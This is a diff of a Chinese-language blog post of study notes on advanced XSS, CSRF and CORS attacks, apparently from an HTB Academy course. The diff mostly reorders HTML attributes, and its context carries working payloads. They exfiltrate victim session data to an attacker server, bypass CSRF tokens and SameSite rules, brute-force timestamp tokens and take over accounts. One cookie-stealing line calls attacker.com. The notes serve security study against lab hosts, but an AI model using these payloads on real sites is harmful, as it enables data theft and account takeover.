 <p>这是严重的安全违规，我们无力阻止其发生。同源政策专门设计来缓解这一问题。</p>
 <p><strong>采用了同源策略</strong></p>
 <p>如上所述，同源政策阻止了跨原点的访问。在上述案例中，由于主机不同，恶意网站攻击的 <code>https://exploitationserver.htb</code> 来源与所有三种来源不同。因此，调用不同源的<code>fetch</code>会在浏览器中引发由同源策略导致的错误，<code>https://exploitationserver.htb</code> 无法访问和窃取数据：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415054310.png" alt="Pasted image 20260415054310" />
-<p>理解同源策略阻止 <a href="https://exploitationserver.htb/" target="_blank" rel="noreferrer">https://exploitationserver.htb</a> 访问跨源请求的响应至关重要。（可能已认证的）请求本身仍然会被发送。我们可以在《Burp》中证实这一点。请注意 <code>Origin</code> 和 <code>Referer</code> 头，表明这确实是一个跨起源请求：理解同源策略阻止 <a href="https://exploitationserver.htb/" target="_blank" rel="noreferrer">https://exploitationserver.htb</a> 访问跨源请求的响应至关重要。（可能已认证的）请求本身仍然会被发送。我们可以在《Burp》中证实这一点。请注意 <code>Origin</code> 和 <code>Referer</code> 头，表明这确实是一个跨起源请求：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415054341.png" alt="Pasted image 20260415054341" />
+<img alt="Pasted image 20260415054310" src="assets/posts/advanced-xss-csrf/Pasted image 20260415054310.png"/>
+<p>理解同源策略阻止 <a href="https://exploitationserver.htb/" rel="noreferrer" target="_blank">https://exploitationserver.htb</a> 访问跨源请求的响应至关重要。（可能已认证的）请求本身仍然会被发送。我们可以在《Burp》中证实这一点。请注意 <code>Origin</code> 和 <code>Referer</code> 头，表明这确实是一个跨起源请求：理解同源策略阻止 <a href="https://exploitationserver.htb/" rel="noreferrer" target="_blank">https://exploitationserver.htb</a> 访问跨源请求的响应至关重要。（可能已认证的）请求本身仍然会被发送。我们可以在《Burp》中证实这一点。请注意 <code>Origin</code> 和 <code>Referer</code> 头，表明这确实是一个跨起源请求：</p>
+<img alt="Pasted image 20260415054341" src="assets/posts/advanced-xss-csrf/Pasted image 20260415054341.png"/>
 <p>这种行为可能导致 CSRF 攻击，因为请求不会被保留。</p>
 <p>同源政策有一些例外情况。例如，我们可以在起源间加入诸如 <code>img</code>、 <code>视频</code>和<code>脚本</code>标签等资源。例如，尽管它被加载为跨来源，我们仍然可以使用以下 HTML 代码在我们拥有的网站上加入 Hack The Box Academy 的标志：</p>
 <pre><code class="language-html">&lt;!DOCTYPE html&gt;
@@ -2031,25 +2031,25 @@ fetch("http://api.vulnerablesite.htb/data", {
 })
 </code></pre>
 <p>然而，如上所述，这违反了同源政策，因为 <code>http://vulnerablesite.htb</code> 和 <code>http://api.vulnerablesite.htb</code> 是不同的来源。因此，上述 JavaScript 代码会导致错误，数据未正确加载：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415055130.png" alt="Pasted image 20260415055130" />
+<img alt="Pasted image 20260415055130" src="assets/posts/advanced-xss-csrf/Pasted image 20260415055130.png"/>
 <p>现在，让我们讨论一下 CORS 的工作原理，以及网页应用如何与 API 通信而不被同源策略错误。</p>
 <p><strong>CORS是如何运转的</strong></p>
 <p>服务器可以通过 CORS 在 HTTP 响应中设置以下任一 CORS 头部来配置同源策略的异常</p>
 <p>如果服务器还想让 JS 读其他响应头，就要用这个字段显式暴露出来。</p>
 <p>也就是说，在这段时间内，浏览器不用每次都重新发 OPTIONS 预检。</p>
-<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin" target="_blank" rel="noreferrer">Access-Control-Allow-Origin</a>: 允许哪个源（Origin）来读取当前响应</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Expose-Headers" target="_blank" rel="noreferrer">Access-Control-Expose-Headers</a>: 默认情况下，前端 JS 在跨域响应里 <strong>只能读取少数“简单响应头”</strong>。</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Methods" target="_blank" rel="noreferrer">Access-Control-Allow-Methods</a>: 这个头主要用于 <strong>预检请求（preflight request）</strong> 的响应中，告诉浏览器： 这个跨域资源允许使用哪些 HTTP 方法</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Headers" target="_blank" rel="noreferrer">Access-Control-Allow-Headers</a>: 这个头也是用于 <strong>预检响应</strong>，告诉浏览器：前端跨域请求里，允许带哪些请求头</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials" target="_blank" rel="noreferrer">Access-Control-Allow-Credentials</a>: 是否允许跨域请求携带凭证，并且让前端 JS 读取响应</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Max-Age" target="_blank" rel="noreferrer">Access-Control-Max-Age</a>: 它告诉浏览器： 这次预检请求的结果，可以缓存多久</li></ul>
+<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin" rel="noreferrer" target="_blank">Access-Control-Allow-Origin</a>: 允许哪个源（Origin）来读取当前响应</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Expose-Headers" rel="noreferrer" target="_blank">Access-Control-Expose-Headers</a>: 默认情况下，前端 JS 在跨域响应里 <strong>只能读取少数“简单响应头”</strong>。</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Methods" rel="noreferrer" target="_blank">Access-Control-Allow-Methods</a>: 这个头主要用于 <strong>预检请求（preflight request）</strong> 的响应中，告诉浏览器： 这个跨域资源允许使用哪些 HTTP 方法</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Headers" rel="noreferrer" target="_blank">Access-Control-Allow-Headers</a>: 这个头也是用于 <strong>预检响应</strong>，告诉浏览器：前端跨域请求里，允许带哪些请求头</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials" rel="noreferrer" target="_blank">Access-Control-Allow-Credentials</a>: 是否允许跨域请求携带凭证，并且让前端 JS 读取响应</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Max-Age" rel="noreferrer" target="_blank">Access-Control-Max-Age</a>: 它告诉浏览器： 这次预检请求的结果，可以缓存多久</li></ul>
 <div class="post-table-wrap"><table><thead><tr><th>头部</th><th>作用</th></tr></thead><tbody><tr><td><code>Access-Control-Allow-Origin</code></td><td>允许哪个源读取响应</td></tr><tr><td><code>Access-Control-Expose-Headers</code></td><td>允许前端额外读取哪些响应头</td></tr><tr><td><code>Access-Control-Allow-Methods</code></td><td>允许跨域使用哪些 HTTP 方法</td></tr><tr><td><code>Access-Control-Allow-Headers</code></td><td>允许跨域请求带哪些请求头</td></tr><tr><td><code>Access-Control-Allow-Credentials</code></td><td>是否允许带 cookie / Authorization 等凭证并读取响应</td></tr><tr><td><code>Access-Control-Max-Age</code></td><td>预检结果缓存多久</td></tr></tbody></table></div>
 <p><strong>Preflight Requests</strong></p>
 <p>所有不属于<code>简单请求</code>条件的请求称为<code>预检请求</code> 。在发送这些交叉起源请求之前，浏览器会向不同的起源发送包含实际交叉起源请求所有参数的<code>预检请求</code> 。这使得网络服务器能够决定是否允许跨源请求。浏览器等待对预检请求的响应，只有在网页服务器通过设置相应的 CORS 头来响应预检请求时，才会继续发送实际的交叉起始请求。由于浏览器在发送实际的跨源请求前会向网页服务器请求许可，因此无法在预检请求中出现 CSRF 漏洞。</p>
 <p>预检检查请求是一个包含以下头部的 <code>OPTIONS</code> 请求：</p>
 <p>访问-控制-请求-方法 ：告知服务器实际请求中使用的 HTTP 方法。</p>
 <p>访问-控制-请求-头部 ：告知服务器实际请求中使用的 HTTP 头部</p>
-<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Request-Method" target="_blank" rel="noreferrer">Access-Control-Request-Method</a>: inform the server about the HTTP method used in the actual request</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Request-Headers" target="_blank" rel="noreferrer">Access-Control-Request-Headers</a>: inform the server about the HTTP headers used in the actual request</li></ul>
+<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Request-Method" rel="noreferrer" target="_blank">Access-Control-Request-Method</a>: inform the server about the HTTP method used in the actual request</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Request-Headers" rel="noreferrer" target="_blank">Access-Control-Request-Headers</a>: inform the server about the HTTP headers used in the actual request</li></ul>
 <p>例如，如果 API 需要接受来自 Web 应用的 POST 请求中的 JSON 数据，简单请求是不够的，因为 Content-Type 设置为 <code>application/json</code>，而简单请求中不允许这样做。因此，浏览器会先发送一次预检请求，再发送实际请求。API 需要相应地设置 CORS 响应头部，以通知浏览器允许跨源请求。更具体地说，必须允许原始 <code>http://vulnerablesite.htb</code>、<code>POST</code> 方法和头部 <code>Content-Type</code>。</p>
 <p>正确配置 CORS 头部后，Web 应用和 API 可以互通，避免同源策略问题。假设用户想通过 POST 请求创建一个新的数据项;用户浏览器首先会发送一个检查前检查请求，以检查 API 是否允许可能存在危险的交叉起源请求：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415064528.png" alt="Pasted image 20260415064528" />
+<img alt="Pasted image 20260415064528" src="assets/posts/advanced-xss-csrf/Pasted image 20260415064528.png"/>
 <p>由于响应包含正确的 CORS 头部，浏览器知道 API 允许预检请求;因此，它继续发送：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415064539.png" alt="Pasted image 20260415064539" />
+<img alt="Pasted image 20260415064539" src="assets/posts/advanced-xss-csrf/Pasted image 20260415064539.png"/>
 <p>由于该请求还包含带有请求起点的 CORS 头部，浏览器会在同源策略中添加异常，允许网页应用访问响应（此例为<code>成功</code>响应）。</p>
 <p>要启用用于更新数据的 <code>PUT</code> 请求和用于删除数据的 <code>DELETE</code> 请求，API 必须在对预检请求的响应中调整 <code>Access-Control-Allow-Methods</code> 的 CORS 头部，以包含所有允许的方法。</p>
 <p>只要请求 <strong>不是简单请求</strong>（比如用 JSON、PUT、DELETE、自定义头），浏览器就会先发一个：</p>
@@ -2120,7 +2120,7 @@ Access-Control-Allow-Credentials: true</code></pre>
 &lt;/script&gt;</code></pre>
 <p>假设受害者在 <code>https://exploitserver.htb/exploit</code> 导航到有效载荷，而浏览器在 <code>https://cors-misconfigs.htb</code> 存储了对错误配置的网页应用的有效凭证。在这种情况下，由于不安全的 CORS 配置，数据被从受害者的有效会话中访问并被窃取给攻击者。</p>
 <p>访问托管有效载荷的网站后，受害者的浏览器会向 <code>https://cors-misconfigs.htb/data.php</code> 发送交叉源请求，并附带凭证，即会话 Cookie：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415070804.png" alt="Pasted image 20260415070804" />
+<img alt="Pasted image 20260415070804" src="assets/posts/advanced-xss-csrf/Pasted image 20260415070804.png"/>
 <p>由于响应在 CORS 头部反映了来源并允许凭证，攻击者的起源 <code>https://exploitserver.htb</code> 会被授予同源策略的例外。因此，有效载荷代码被允许访问响应并通过发送到攻击者的 HTTPS 泄露服务器来将其泄露：</p>
 <pre><code>Chenduoduo@htb[/htb]$ python3 server.py 
 
@@ -2160,7 +2160,7 @@ Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...
 &lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
 <ul><li><code>sandbox="allow-scripts allow-top-navigation allow-forms</code>, 开启沙盒模式, 将iframe变为一个受限环境, 没有<code>allow-same-origin</code>, 浏览器会把这个iframe的origin设为<code>null</code>.</li></ul>
 <p>使用该负载，利用方法与之前错误配置相同。然而，沙箱 iframe 导致交叉起源请求为<code>null</code> ：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415174331.png" alt="Pasted image 20260415174331" />
+<img alt="Pasted image 20260415174331" src="assets/posts/advanced-xss-csrf/Pasted image 20260415174331.png"/>
 <h3>针对本地网络</h3>
 <p><strong>Background  背景</strong></p>
 <p>即使网页应用未配置 CORS 允许凭证，攻击者仍可能针对在防火墙、反向代理或 NAT 后运行的本地网络中无法公开访问的网络应用。如果这些内部 Web 应用不要求认证，且包含信任攻击者来源的 CORS 错误配置，数据窃取可能成为可能。</p>
@@ -2178,7 +2178,7 @@ Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...
     xhr.send();
 &lt;/script&gt;</code></pre>
 <p>假设打开负载的受害者与内部 API 处于同一内部网络中，因此可以访问该 API。在这种情况下，受害者的浏览器会在内部网络内发出交叉源请求：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415180612.png" alt="Pasted image 20260415180612" />
+<img alt="Pasted image 20260415180612" src="assets/posts/advanced-xss-csrf/Pasted image 20260415180612.png"/>
 <p>响应随后被泄露给攻击者，使得无法公开访问的网页应用数据得以窃取。</p>
 <p>此外，攻击者不需要知道错误配置应用运行的 IP 地址和端口，但可以通过尝试请求不同的 IP 地址和端口组合来提升内部网络扫描的负载，直到找到应用。</p>
 <p>注意，我们可以通过使用 GET 请求来进行撤离，而不是 POST，从而简化有效载荷，有效载荷类似于以下内容：</p>
@@ -2199,12 +2199,12 @@ Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...
 <p>如果我们能因 CORS 配置错误而绕过同源策略，就能访问我们发出的跨源请求的响应。这允许我们向创建有效 CSRF 令牌的端点发送交叉起源请求，读取该令牌，嵌入状态改变的交叉起源请求中，并用有效的 CSRF 令牌发送状态改变的交叉起源请求。由于所有这些都发生在受害者的会话中，即使经过正确检查并绑定到受害者的用户会话，CSRF 令牌仍然有效。</p>
 <p>然而，为了让受害者的浏览器发送受害者的会话 Cookie 以及 JavaScript 请求，我们要求易受攻击的网页应用必须明确将 <code>SameSite</code> cookie 属性设置为<code>null</code>,  此外还要处理 CORS 配置错误。根据规范，这仅允许通过<code>secure</code> Cookie 属性传输，该属性仅通过安全 HTTPS 连接实现 Cookie 传输。Cookie 不会通过任何未加密的 HTTP 连接发送。</p>
 <p>由于这一限制，示例网页应用及所有其他实验室组件只能通过 HTTPS 访问。如果我们分析网页应用，可以注意到该应用设置了<code>Access-Control-Allow-Origin</code>和<code>Access-Control-Allow-Credentials</code>的 CORS 头部，表明我们应检查 CORS 配置错误。此外，会话 cookie 同时设置了 <code>Secure</code> 和 <code>SameSite=None</code> 这两个 cookie 属性：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415185929.png" alt="Pasted image 20260415185929" />
+<img alt="Pasted image 20260415185929" src="assets/posts/advanced-xss-csrf/Pasted image 20260415185929.png"/>
 <p>我们可以分析网页应用对 HTTP <code>Origin</code> 头部不同值的反应。如果我们提供任意值，可以看到网页应用确实配置错误，因为任意起源反映在<code>Access-Control-Allow-Origin</code>的 CORS 首部：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415190236.png" alt="Pasted image 20260415190236" />
+<img alt="Pasted image 20260415190236" src="assets/posts/advanced-xss-csrf/Pasted image 20260415190236.png"/>
 <p>我们可以利用 <code>SameSite=None</code> cookie 属性利用 CORS 错误配置，绕过正确的 CSRF 保护，实施 CSRF 攻击。让我们进一步分析该网页应用，以识别此次攻击的潜在目标。</p>
 <p>和之前一样，网页应用实现了向管理员推广用户账户的功能。这一次，对应的 POST 请求得到了 CSRF 令牌的妥善保护：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415190439.png" alt="Pasted image 20260415190439" />
+<img alt="Pasted image 20260415190439" src="assets/posts/advanced-xss-csrf/Pasted image 20260415190439.png"/>
 <p>我们编写一个漏洞利用，在受害者会话中获取有效的 CSRF 令牌，然后发起相应的跨源请求，迫使受害者提升我们的用户账户为管理员权限。CSRF 令牌是响应向 <code>/profile.php</code> 端点发送的 GET 请求。我们可以提出相应的请求，解析响应，并使用类似以下的 JavaScript 代码提取 CSRF 令牌：</p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
 xhr.open('GET', 'https://bypassing-csrftokens.htb/profile.php', false);
@@ -2238,9 +2238,9 @@ csrf_req.send(params);</code></pre>
     csrf_req.send(params);
 &lt;/script&gt;</code></pre>
 <p>如果我们查看漏洞利用，可以看到一个经过认证的 GET 请求发给 <code>/profile.php</code>，随后是 <code>profile.php</code> 一个带有有效 CSRF 令牌的认证 POST 请求。因此，我们的漏洞应该能奏效。在将邮件送达受害者并等待几秒钟后，我们的用户被提升为管理员。因此，我们成功利用了 CORS 错误配置，绕过了 CSRF 保护，成功实施了 CSRF 攻击：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415190555.png" alt="Pasted image 20260415190555" />
+<img alt="Pasted image 20260415190555" src="assets/posts/advanced-xss-csrf/Pasted image 20260415190555.png"/>
 <p>直接在登陆页面进行权限提升</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415194750.png" alt="Pasted image 20260415194750" />
+<img alt="Pasted image 20260415194750" src="assets/posts/advanced-xss-csrf/Pasted image 20260415194750.png"/>
 <pre><code>POST /login.php HTTP/1.1
 
 Host: bypassing-csrftokens.htb
@@ -2306,12 +2306,12 @@ r.send('promote=htb-stdnt&amp;csrf_token='+t);
 <p>如果必须绕过<code>strict</code>的 SameSite 限制，我们可以将上述错误配置与目标站点的客户端重定向结合起来。如果我们写了一个将受害者发送到客户端重定向端点的有效载荷，客户端重定向是由目标站点发起的，因此被视为 SameSite。因此，即使 SameSite 属性设置为<code>strict</code> ，受害者的 Cookie 也会随请求一起发送。如果我们将受害者重定向到那个接受状态更改操作的 GET 请求的配置错误端点，就可以成功执行 CSRF 攻击。</p>
 <blockquote><strong>注意：</strong> 这种绕过仅适用于客户端重定向，不适用于服务器端重定向，如 HTTP 3xx 状态码。</blockquote>
 <p>举例来说，考虑以下网页应用，它将会话 Cookie 的 SameSite cookie 属性设置为<code>strict</code> ：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415202639.png" alt="Pasted image 20260415202639" />
+<img alt="Pasted image 20260415202639" src="assets/posts/advanced-xss-csrf/Pasted image 20260415202639.png"/>
 <p>有趣的是，网页应用在成功登录后会将我们重定向到一个临时页面，然后该页面又重定向到我们的个人资料：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415202651.png" alt="Pasted image 20260415202651" />
+<img alt="Pasted image 20260415202651" src="assets/posts/advanced-xss-csrf/Pasted image 20260415202651.png"/>
 <p>查看源代码，我们可以看到由此产生的重定向是通过 HTML <code>meta</code>标签实现的，这是一种客户端重定向：</p>
 <p>此外，我们可以通过<code>user</code>的 GET 参数向 URL 注入额外的 GET 参数，因为 Web 应用似乎在重定向 URL 中复制了该参数：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415203605.png" alt="Pasted image 20260415203605" />
+<img alt="Pasted image 20260415203605" src="assets/posts/advanced-xss-csrf/Pasted image 20260415203605.png"/>
 <p>用户配置文件存在几节前讨论的 CSRF 漏洞，使我们可以通过 <code>/profile.php？promote=htb-stdnt</code> 端点推广用户。然而，由于 SameSite 属性设置为<code>严格</code> ，我们之前的负载无法正常工作。相反，我们可以利用客户端重定向来设计成功的 CSRF 漏洞利用。为此，我们必须确保受害者能够访问终端，从而实现客户端重定向。此外，受害者需要被重定向到包含 <code>promote=htb-stdnt</code> GET 参数的 URL 来将用户提升为管理员权限。我们可以通过类似以下载荷实现：</p>
 <pre><code class="language-html">&lt;script&gt;
 document.location = "https://vulnerablesite.htb/admin.php?user=htb-stdnt%26promote=htb-stdnt";
@@ -2319,7 +2319,7 @@ document.location = "https://vulnerablesite.htb/admin.php?user=htb-stdnt%26promo
 <p>将该有效载荷设置为我们的漏洞利用并传递给受害者，成功执行 CSRF 攻击。随后，我们获得了网页应用的管理员权限。</p>
 <p>最后，由于子域名被视为 SameSite，我们可以利用子域名中的 XSS 漏洞绕过 SameSite cookie 的限制。在这种情况下，交叉来源请求被视为 SameSite。因此，受害者的 Cookie 会随请求一起发送，从而成功实施 CSRF 攻击。我们将在后续章节中更详细探讨这一情景。</p>
 <p>查看我们的示例网页应用，可以看到它在会话 cookie 上设置<code>SameSite=Strict</code> 属性，防止 Cookie 通过任何跨站请求发送：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415203729.png" alt="Pasted image 20260415203729" />
+<img alt="Pasted image 20260415203729" src="assets/posts/advanced-xss-csrf/Pasted image 20260415203729.png"/>
 <p>然而，正如我们之前讨论的，子域名被视为同一网站的一部分。因此，让我们尝试识别可能受到 XSS 影响的子域名。我们可以用 <code>gobuster</code> 来实现：</p>
 <pre><code>Chenduoduo@htb[/htb]$ gobuster vhost -k -u https://vulnerablesite.htb -w /path/to/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 
@@ -2333,7 +2333,7 @@ Found: guestbook.vulnerablesite.htb (Status: 200) [Size: 2317]
 2023/08/26 12:09:43 Finished
 ===============================================================</code></pre>
 <p>通过查看子域名 <code>https://guestbook.vulnerablesite.htb</code>，我们可以识别出几节前提到的留言簿网页应用。我们可以确认，同样的 XSS 漏洞依然存在：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415203947.png" alt="Pasted image 20260415203947" />
+<img alt="Pasted image 20260415203947" src="assets/posts/advanced-xss-csrf/Pasted image 20260415203947.png"/>
 <p>假设监控留言簿条目的管理员也在 <code>https://vulnerablesite.htb</code> 登录主应用程序，我们可以利用该 XSS 漏洞绕过 SameSite 限制，让管理员将我们的用户晋升为管理员。为此，我们需要强制管理员用户发送相应的 POST 请求，这可以通过以下 XSS 负载实现：</p>
 <pre><code class="language-html">&lt;script&gt;
     var csrf_req = new XMLHttpRequest();
@@ -2345,11 +2345,11 @@ Found: guestbook.vulnerablesite.htb (Status: 200) [Size: 2317]
 &lt;/script&gt;
 </code></pre>
 <p>在将我们的负载发布到留言簿并等待管理员用户访问页面几秒钟后，我们可以看到 CSRF 攻击成功，我们的用户已被晋升：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415204018.png" alt="Pasted image 20260415204018" />
+<img alt="Pasted image 20260415204018" src="assets/posts/advanced-xss-csrf/Pasted image 20260415204018.png"/>
 <h3>弱 Token 爆破</h3>
 <p>正如<code>Session Security</code>模块中简要讨论的，弱 CSRF 令牌可以通过绕过以成功发动 CSRF 攻击。当 CSRF 令牌未绑定到用户会话时，可以进行简单绕过。在这种情况下，攻击者访问受损的网络应用时，可以从自己的会话向交叉源请求添加有效的 CSRF 令牌。后端随后会接受来自受害者会话的交叉起始请求，因为 CSRF 令牌有效。另一个例子是 CSRF 代币并非完全随机，使其可预测。根据 CSRF 令牌的创建方式（比如用户名的哈希值或当前时间戳），我们可能能一次性猜测，或者用有效载荷暴力破解。</p>
 <p>这一次，网页应用已用 CSRF 令牌保护，因此普通的 CSRF 攻击将不再成功。然而，如果我们获得多个 CSRF 令牌，可以推断这是一个递增的数字，可能类似于计数器，因此可以暴力破解：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415204116.png" alt="Pasted image 20260415204116" />
+<img alt="Pasted image 20260415204116" src="assets/posts/advanced-xss-csrf/Pasted image 20260415204116.png"/>
 <p>如果我们更仔细地分析 CSRF tokens，可以发现 CSRF 代币仅仅是作为 Unix 时间戳的当前时间。这使得 CSRF 令牌具有可预测性，并允许我们创建可行的漏洞来执行 CSRF 攻击。为此，我们必须正确猜测受害者的 CSRF 令牌，即受害者在访问我们的有效载荷前最后一次访问 <code>/profile.php</code> 端点的时间。由于默认 SameSite <code>Lax</code> 策略的限制，我们无法用 JavaScript 代码动态暴力破解 CSRF 令牌，因此很难精确掌握时机。因此，我们需要在 HTML 表单中硬编码猜测的 CSRF 令牌，并更新每个猜测的值：</p>
 <pre><code class="language-html">&lt;html&gt;
   &lt;body&gt;
@@ -2390,9 +2390,9 @@ document.location = "https://misc-csrf.htb/admin.php?user=htb-stdnt%26promote=ht
 <p><strong>HttpOnly Cookie flag</strong> 窃取受害者会话 Cookie 是威胁行为者利用 XSS 漏洞最广泛利用的手段。然而，通过使用会话 cookie 上的 <code>HttpOnly</code> 属性，可以防止这种技术。该属性阻止 JavaScript 代码访问该 Cookie。 更具体地说，如果我们访问 <code>document.cookie</code>，带有 <code>HttpOnly</code> 属性的 Cookie 将不存在，这实际上防止了受害者会话 cookie 被窃取。然而，这并不一定减轻 XSS 漏洞的严重性。由于 XSS 允许我们在受害者的浏览器中，在易受攻击的网络应用中执行任意 JavaScript 代码，并且在受害者的上下文中，我们可以执行与知道会话 Cookie 相同的操作。然而，我们需要编写一个 XSS 负载来代表我们执行相应的操作，而不是在浏览器中设置受害者会话 Cookie 后手动操作。</p>
 <p><strong>Exfiltrating Data with XSS</strong></p>
 <p>XSS攻击的payload是在受害者浏览器或用户环境中执行, 使得攻击者可以获得从受害者视角访问的数据. 低权限攻击者可以利用XSS漏洞获取对受害者应用的管理访问权想, 前提是受害者有管理权限. 我们可以利用这一点, 从网页应用中窃取任意数据.</p>
-<p>为了访问受害者上下文中的信息并将信息泄露到我们的泄露服务器，我们可以使用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest" target="_blank" rel="noreferrer">XMLHttpRequest</a> 对象，这使我们能够发送 HTTP 请求并与响应互动。</p>
+<p>为了访问受害者上下文中的信息并将信息泄露到我们的泄露服务器，我们可以使用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest" rel="noreferrer" target="_blank">XMLHttpRequest</a> 对象，这使我们能够发送 HTTP 请求并与响应互动。</p>
 <p>我们的示例网页应用是我们之前见过的同款留言簿应用。同样的 XSS 漏洞依然存在。不过这次，会话 Cookie 设置了 <code>HttpOnly</code> 标志，防止我们窃取：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418042747.png" alt="Pasted image 20260418042747" />
+<img alt="Pasted image 20260418042747" src="assets/posts/advanced-xss-csrf/Pasted image 20260418042747.png"/>
 <blockquote>设置了<code>HttpOnly</code>的Cookie, 不能被<code>document.cookie</code>读取, 不能被任何前端JS访问.</blockquote>
 <blockquote>例如, 常见的窃取方式是XSS, <code>new Image().src="http://attacker.com/?c="+document.cookie</code></blockquote>
 <blockquote><code>HttpOnly</code>阻断的是从浏览器脚本到Cookie的读取路径.</blockquote>
@@ -2417,7 +2417,7 @@ Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...
 10.129.136.40 - - [30/Nov/2025 12:36:37] [i] POST body: {"data":"CjwhRE&lt;SNIP&gt;Ww+"}
 10.129.136.40 - - [30/Nov/2025 12:36:37] "POST /log HTTP/1.1" 200 -</code></pre>
 <p>解码响应后，我们可以分析它是否与低权限用户在 <code>/home.php</code> 端点访问的内容有差异。我们可以发现，在回复的导航部分，/<code>admin.php</code> 有对管理员仪表盘的引用，但在我们用户的上下文中没有：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418043458.png" alt="Pasted image 20260418043458" />
+<img alt="Pasted image 20260418043458" src="assets/posts/advanced-xss-csrf/Pasted image 20260418043458.png"/>
 <p>让我们通过调整漏洞服务器的负载，将/<code>admin.php</code> 端点改为窃取，从而窃取管理员仪表盘，包括任何潜在敏感数据：</p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
 xhr.open('GET', '/admin.php', true);
@@ -2430,7 +2430,7 @@ xhr.onload = () =&gt; {
 };
 xhr.send();</code></pre>
 <p>我们不会在留言簿上发布新条目，因为管理员会定期访问留言簿，每次都会触发我们的 XSS 负载。由于这会触发从漏洞利用服务器加载的有效载荷代码，修改利用代码即可。这使我们能够提取整个管理仪表盘，包括管理员访问的所有信息：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418043537.png" alt="Pasted image 20260418043537" />
+<img alt="Pasted image 20260418043537" src="assets/posts/advanced-xss-csrf/Pasted image 20260418043537.png"/>
 <pre><code class="language-js"># 创建一个新的http请求对象
 var xhr = new XMLHttpRequest();
 # 请求方法, 访问路径, 异步请求(发请求时不会卡住整个页面, 请求完成后执行回调函数) 
@@ -2452,9 +2452,9 @@ xhr.send();</code></pre>
 <h2>从受害者会话发起攻击</h2>
 <p>在讨论如何从带有 XSS 漏洞的受害者用户上下文中窃取数据后，我们将探讨如何触发可能改变状态的操作。由于 XSS 赋予我们对受害者会话的完全控制，我们可以在受害者用户上下文中触发网页应用实现的任何功能。这可能导致受害者账户被完全接管，或助长进一步攻击。</p>
 <p><strong>账户接管</strong> 这一次，我们的示例网页应用包含了更新用户资料的功能，包括用户密码：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418060231.png" alt="Pasted image 20260418060231" />
+<img alt="Pasted image 20260418060231" src="assets/posts/advanced-xss-csrf/Pasted image 20260418060231.png"/>
 <p>更新配置文件通过以下 HTTP 请求实现：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418152825.png" alt="Pasted image 20260418152825" />
+<img alt="Pasted image 20260418152825" src="assets/posts/advanced-xss-csrf/Pasted image 20260418152825.png"/>
 <p>由于更新账户密码不需要使用旧密码，我们可以利用已知的 XSS 漏洞更改受害者的密码。这使我们能够登录受害者的账户，从而完全接管他们的账户。表单通过 CSRF_token保护，但由于存在 XSS 漏洞，我们可以读取 CSRF 令牌并将其添加到请求中。</p>
 <p>为此，我们使用之前章节中使用的同样的 XSS 漏洞，从漏洞服务器加载 JavaScript 代码：</p>
 <pre><code class="language-html">&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
@@ -2480,7 +2480,7 @@ csrf_req.send(params);</code></pre>
